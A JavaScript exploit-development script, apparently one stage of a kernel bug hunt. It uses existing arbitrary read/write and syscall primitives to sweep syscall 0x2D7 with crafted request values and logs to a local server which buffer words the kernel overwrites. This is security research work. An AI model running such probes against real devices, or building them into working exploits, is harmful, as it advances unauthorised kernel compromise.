// 13_727c.js — high-word bias sweep: req=(bias<<16)|low per writeup
// (src idx = bias+edx scaled 0x28; dst bounded by count). Same session.
(async () => {
    const LOG_HOST = "192.168.0.163";
    const say = (s) => { try { log("[b13] " + s); } catch (e) {} };
    const shout = (s) => { try { send_notification(s); } catch (e) {} };
    try { LOG_SERVER = "http://" + LOG_HOST + ":8080/log"; } catch (e) {}
    try { if (typeof checkLogServer === "function") await checkLogServer(); } catch (e) {}
    const pace = () => new Promise((r) => setTimeout(r, 500));
    const REQS = [0x10001n, 0x10002n, 0x20001n, 0x30001n, 0x7F0001n];
    shout("b13: start"); say("start"); await pace();
    for (const req of REQS) {
        for (const shape of ["2a", "3a"]) {
            const tag = shape + "/0x" + req.toString(16);
            shout("b13: " + tag); say(tag); await pace();
            try {
                const ob = malloc(0x40);
                for (let i = 0n; i < 0x40n; i += 8n) write64(ob + i, 0xDEADBEEFn + i);
                const args = shape === "2a" ? [req, ob, 0n,0n,0n,0n] : [req, 1n, ob, 0n,0n,0n];
                const r = await syscall(0x2D7n, ...args);
                let ch = [];
                try {
                    for (let i = 0n; i < 0x40n; i += 8n) {
                        const v = read64(ob + i);
                        if (v !== (0xDEADBEEFn + i)) ch.push(i.toString() + "=" + v.toString(16));
                    }
                } catch (e) { ch.push("READFAULT"); }
                shout(("b13: " + tag + " ret=" + String(r) + " ch=" + ch.length).slice(0,110));
                say(tag + " ret=" + String(r) + " ch[" + ch.length + "]" + (ch.length ? " " + ch.slice(0,4).join(" ") : ""));
                await pace();
            } catch (e) { shout("b13: " + tag + " THREW"); say(tag + " threw"); await pace(); }
        }
    }
    shout("b13: done"); say("bias sweep done");
})()
